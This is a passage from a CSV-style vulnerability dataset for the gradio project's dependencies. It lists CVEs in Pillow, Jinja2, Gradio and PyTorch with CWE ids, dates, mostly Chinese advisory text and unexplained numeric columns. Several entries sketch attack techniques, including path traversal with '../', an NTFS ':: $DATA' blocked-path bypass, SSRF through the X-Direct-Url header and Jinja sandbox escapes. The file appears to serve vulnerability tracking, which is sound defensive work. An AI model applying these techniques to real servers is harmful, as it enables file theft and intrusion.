Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
gradio-app_gradio,jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
gradio-app_gradio,jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
gradio-app_gradio,jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
gradio-app_gradio,jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
gradio-app_gradio,jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
gradio-app_gradio,jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
gradio-app_gradio,jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
gradio-app_gradio,jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
gradio-app_gradio,jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
gradio-app_gradio,gradio,,True,CVE-2024-4941,CWE-22,,Gradio 是一个开源 Python 库，用于通过友好的 Web 界面演示机器学习模型。Gradio 4.25 版本中存在输入验证错误漏洞，该漏洞源于 `gradio/components/json_component.py` 的 `postprocess` 函数，由于路径验证不当，攻击者可以发送恶意的 JSON 对象，其中包含 `path` 键，进而读取远程系统上的文件，导致信息泄露。,2,1
gradio-app_gradio,gradio,,True,CVE-2023-41626,CWE-434,2023-09-15,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio v3.27.0 版本存在安全漏洞，该漏洞源于/upload接口存在任意文件上传漏洞。",3,0
gradio-app_gradio,gradio,,True,CVE-2023-34239,CWE-20,2023-06-07,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 3.33.1及之前版本存在输入验证错误漏洞，该漏洞源于缺少路径过滤，导致Gradio没有正确限制用户的文件访问。",3,2
gradio-app_gradio,gradio,,True,,CWE-22,2022-01-04,"## Overview
[gradio](https://pypi.org/project/gradio) is a Python library for easily interacting with trained machine learning models

Affected versions of this package are vulnerable to Arbitrary File Read due to missing file path validation in `gradio/networking.py`.
## Remediation
Upgrade `gradio` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/gradio-app/gradio/pull/406/commits/8bdc59735f99635c76ea07f5ee4c6b622ab0d238)
- [GitHub PR](https://github.com/gradio-app/gradio/pull/406)
",3,0
gradio-app_gradio,gradio,,True,CVE-2023-6572,CWE-77,,"Gradio是一个开源的 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。此漏洞源于应用会将敏感信息暴露给未经授权的参与者。当用户能够控制`github.event.workflow_run.head_branch`的值时，可以在""生成变更集""工作流中注入shell命令。该漏洞的影响范围广泛，攻击者可以利用这一点操控系统执行任意命令。",1,1
gradio-app_gradio,gradio,,True,CVE-2024-0964,CWE-22,,"Gradio是一个开源Python库，旨在通过友好的Web界面演示机器学习模型。该漏洞源于API请求中用户提供的JSON值的缺乏正确验证，攻击者可以通过构造特定的JSON负载利用这个漏洞，读取服务器上的任意文件。当攻击者使用路径遍历序列（例如""../""）或绝对文件路径时，可能会访问存储在文件系统中的任意文件及目录，包括应用程序源代码、配置文件及其他关键系统文件。",2,1
gradio-app_gradio,gradio,,True,CVE-2023-51449,CWE-22,2023-12-22,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。在 Gradio 4.11.0 之前的版本中，存在路径遍历漏洞。该漏洞的根本原因在于 /file 端点对输入路径的处理不当，攻击者可以通过构造恶意路径来访问服务器上的任意文件。,3,1
gradio-app_gradio,gradio,,True,CVE-2021-43831,CWE-22,2021-12-15,Gradio 是一个开源 Python 库，用于通过用户友好的 Web 界面演示和交互机器学习模型。Gradio 2.5.0 之前的版本存在一个安全漏洞，该漏洞源于对文件访问权限控制不当。攻击者可以利用此漏洞访问主机上的任何文件，从而读取本不应访问的数据和信息。,1,1
gradio-app_gradio,gradio,,True,,CWE-918,2024-01-01,"## Overview
[gradio](https://pypi.org/project/gradio) is a Python library for easily interacting with trained machine learning models

Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) using the `/file` route since it used to perform a `GET/HEAD` request to determine if a `filepath` was a possible URL.
## Remediation
Upgrade `gradio` to version 4.10.0 or higher.
## References
- [GitHub PR](https://github.com/gradio-app/gradio/pull/6794)
",3,0
gradio-app_gradio,gradio,,True,CVE-2024-1729,CWE-367,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。该漏洞源于字符串比较方式处理不当，在遇到字符串不匹配时可提前终止，攻击者可以利用这一行为进行暴力破解，猜测密码受保护的应用程序。攻击者可以发起大量请求而不受请求限制，从而容易猜测出正确的用户凭证。,3,1
gradio-app_gradio,gradio,,True,CVE-2022-24770,CWE-1236,2022-03-17,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 2.8.11之前版本 存在安全漏洞，该漏洞源于gradio中 CSV 文件的公式元素中和不当。该漏洞允许攻击者将任意文本保存到 CSV 文件中。如果像 MS Excel 程序打开这样的文件，它会自动运行这些命令，这会导致在用户的计算机上运行任意命令。",2,0
gradio-app_gradio,gradio,,True,CVE-2023-25823,CWE-798,2023-02-23,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 3.13.1之前版本存在安全漏洞，该漏洞源于包含硬编码凭证的使用。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-1727,CWE-352,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。该漏洞源于 CORS 规则的实现不当，导致攻击者可以通过构造特定请求，绕过要求 `host` 头部为 localhost（或其别名）、`origin` 头部的限制，从而实施跨站请求伪造攻击。攻击者可以利用此漏洞，向运行 Gradio 的本地服务器发送请求，上传多个大型文件，导致目标系统的可用磁盘空间耗尽，进而可能影响服务的可用性。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-2206,CWE-918,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。此漏洞存在于 Gradio 的 /proxy 路由中，攻击者可以通过操纵请求中的 X-Direct-Url 头，允许代理任意 URL，包括潜在的内部端点。由于应用程序在处理自定义网址时缺乏适当的验证，这使得攻击者能够将 URL 添加到代理请求中，从而损害系统的安全性。通过此方法，攻击者可以获取内部网络信息。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1540,CWE-77,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面演示机器学习模型。存在命令注入漏洞，该漏洞源于不当处理 CI 过程中的命令行参数。攻击者可以通过特定的输入在执行 shell 脚本时注入恶意命令，造成信息泄露和未授权的基库修改。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1728,CWE-22,,Gradio是一个开源的Python库，通过友好的Web界面演示机器学习模型。该漏洞源于对用户输入的验证不当，攻击者可以通过操控上传至'/queue/join'端点的文件路径来读取文件系统中的任意文件，如私钥等。该漏洞可能导致远程代码执行，使得攻击者能够将文件上传重定向到服务器上未预期的位置。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1561,CWE-29,,Gradio 是一个开源的 Python 库，用于以友好的 Web 界面展示机器学习模型。该库存在一个不当访问控制的漏洞，具体表现为 `/component_server` 端点错误地允许以攻击者控制的参数调用 `Component` 类上的任何方法。攻击者可以利用 `Block` 类的 `move_resource_to_block_cache()` 方法，通过该漏洞实现对本地文件的未授权读取，从而可能导致敏感信息泄露。尤其是在通过 `launch(share=True)` 暴露应用程序到互联网后，任何人都可以读取用户计算机上的文件。此外，所有托管在 huggingface.co 上的 Gradio 应用程序也受到此漏洞的影响。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-1183,CWE-601,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面与训练好的机器学习模型进行交互。存在服务器端请求伪造 (SSRF) 漏洞，源于对 'file' 参数的处理不当。攻击者可以通过构造特定的 GET 请求，利用此漏洞扫描和识别内部网络中的开放端口，通过 'Location' 头或 'File not allowed' 错误的响应来判断内部端口的状态。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-34511,CWE-284,2024-05-05,Gradio 是一个开源的 Python 库，用于创建用户友好的接口，广泛应用于机器学习和数据科学应用。此漏洞存在于 Gradio 组件处理 `_is_server_fn` 属性验证的过程中。由于对函数 `_is_server_fn` 属性的验证不当，攻击者可能会利用该漏洞执行原本受限的函数，进而实现未授权的操作或访问敏感数据。,3,0
gradio-app_gradio,gradio,,True,CVE-2024-34510,CWE-116,2024-05-05,"Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 4.20之前版本存在安全漏洞，该漏洞源于允许 Windows 上的凭据泄露。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-4940,CWE-601,,Gradio是一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。此库存在输入验证错误漏洞，该漏洞源于开放重定向的安全问题。攻击者可以通过构造恶意的 URL，将用户重定向到任意网站，从而进行网络钓鱼攻击、跨站脚本攻击 (XSS) 等。利用此漏洞，攻击者能够根据响应中的 'Location' 头或 '文件不允许' 错误判断内部网络中开放端口的状态，从而逐步扫描内部网络。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-4325,CWE-918,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面简化机器学习模型的演示。该漏洞存在于 Gradio 4.21.0 版本的 `/queue/join` 端点和 `save_url_to_cache` 函数中。由于对用户输入的 `path` 参数未进行充分的验证，攻方可以通过发送特制请求实现对内部网络或 AWS 元数据端点的未授权访问。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-47867,CWE-345,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在数据伪造问题漏洞，该漏洞源于如果攻击者获得下载 FRP 客户端的远程 URL 的访问权限，他们可以在不被发现的情况下修改二进制文件，因为 Gradio 服务器不会验证文件的校验和或签名。",4,2
gradio-app_gradio,gradio,,True,CVE-2024-47167,CWE-918,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于Gradio 的 `async_save_url_to_cache` 函数允许攻击者强制 Gradio 服务器向用户控制的 URL 发送 HTTP 请求。",3,1
gradio-app_gradio,gradio,,True,CVE-2024-47870,CWE-362,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在竞争条件问题漏洞，该漏洞源于攻击者利用该漏洞可以将用户流量重定向到恶意服务器。",2,0
gradio-app_gradio,gradio,,True,CVE-2024-47084,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于攻击者利用该漏洞可以向本地 Gradio 服务器发出未经授权的请求。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47872,CWE-79,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在跨站脚本漏洞，该漏洞源于经过身份验证的用户可以上传包含恶意脚本的文件，例如 HTML、JavaScript 或 SVG 文件。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47869,CWE-203,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于比较不是在恒定时间内完成的，攻击者可以通过测量不同请求的响应时间来逐字节推断正确的哈希值，从而利用这一点。",4,0
gradio-app_gradio,gradio,,True,CVE-2024-47168,CWE-670,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于即使在监控被禁用的情况下，攻击者或未经授权的用户仍然可以通过直接请求 /monitoring 端点来访问监控仪表板。",4,0
gradio-app_gradio,gradio,,True,CVE-2024-47164,CWE-22,2024-10-10,<p>Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。 Gradio存在路径遍历漏洞，该漏洞源于is_in_or_equal函数旨在检查文件是否位于给定目录中，可以使用某些使用`..`序列操纵文件路径来绕过该函数。</p>,4,2
gradio-app_gradio,gradio,,True,CVE-2024-47868,CWE-200 CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在信息泄露漏洞，该漏洞源于攻击者利用该漏洞可以通过制作绕过预期输入限制的请求来利用这些组件。",3,2
gradio-app_gradio,gradio,,True,CVE-2024-47871,CWE-311,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在安全漏洞，该漏洞源于HTTPS 未在连接上强制执行。攻击者利用该漏洞可以拦截和读取上传到 Gradio 服务器的文件，以及修改客户端和服务器之间发送的响应或数据。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-47165,CWE-285,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在授权问题漏洞，该漏洞源于当 Gradio 服务器在本地部署时，`localhost_aliases` 变量包含“null”作为有效来源。",3,0
gradio-app_gradio,gradio,,True,CVE-2024-47166,CWE-22,2024-10-10,"Gradio是Hugging Face开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio存在路径遍历漏洞，该漏洞源于攻击者利用该漏洞可以通过操纵请求中的文件路径来访问和泄露自定义 Gradio 组件的源代码。",4,2
gradio-app_gradio,gradio,,True,CVE-2024-48052,CWE-918,2024-11-04,Gradio 是一个用于通过友好的Web界面展示和分享机器学习模型的开源Python库，能够简化数据科学家和开发者演示他们模型的过程。在版本4.42.0的Gradio中，其gr.DownloadButton函数中存在服务器端请求伪造（SSRF）漏洞。攻击者可能利用该漏洞通过该功能发送精心构造的请求，从而导致服务器执行未授权的外部请求。,2,0
gradio-app_gradio,gradio,,True,CVE-2025-23042,CWE-285,2025-01-14,"Gradio是Gradio开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 5.6.0之前版本存在授权问题漏洞，该漏洞源于对文件的路径验证逻辑缺乏规范化。攻击者利用该漏洞可以通过更改被阻止的文件或目录路径的字母大小写，绕过Gradio的文件路径访问控制列表（ACL）。",2,2
gradio-app_gradio,gradio,,True,CVE-2024-8966,CWE-770,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面展示训练好的机器学习模型。在其文件上传过程中，存在一个拒绝服务（DoS）漏洞。攻击者可以在 multipart 边界的结尾添加大量字符，导致系统不断处理每个字符并发出警告。这可能导致 Gradio 在长时间内无法访问，从而中断服务，造成显著的停机时间。,2,1
gradio-app_gradio,gradio,,True,CVE-2024-8021,CWE-601,,Gradio是一个开源的Python库，旨在通过友好的Web界面来演示机器学习模型。该库的最新版本存在开放重定向漏洞，允许攻击者通过URL编码的方式将用户重定向到恶意网站。此漏洞的根本原因在于Gradio在处理重定向请求时未能对外部URL进行足够的验证。攻击者可以通过发送特制请求，导致服务器返回302重定向到攻击者控制的网站。,3,1
gradio-app_gradio,gradio,,True,CVE-2024-12217,CWE-22,,Gradio 是一个开源的 Python 库，旨在以友好的 Web 界面演示机器学习模型。该库在版本 git 67e4044 中存在一个路径遍历漏洞，其根本原因在于 blocked_path 功能的实现缺陷。具体来说，尽管该应用程序能正确阻止对类似 'C:/tmp/secret.txt' 的路径访问，但在使用 NTFS 备用数据流（ADS）语法时，例如 'C:/tmp/secret.txt::$DATA'，却未能阻止访问。这一缺陷可能导致未授权用户读取被阻止的文件路径。,3,1
gradio-app_gradio,gradio,,True,CVE-2025-48889,CWE-434,2025-05-30,Gradio的标记功能存在任意文件复制漏洞，攻击者可以绕过身份验证，复制服务器文件系统中的任何可读文件。攻击者不能读取复制的文件，但可以通过复制大型文件（如/dev/urandom）填满磁盘空间，导致服务拒绝。,3,2
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
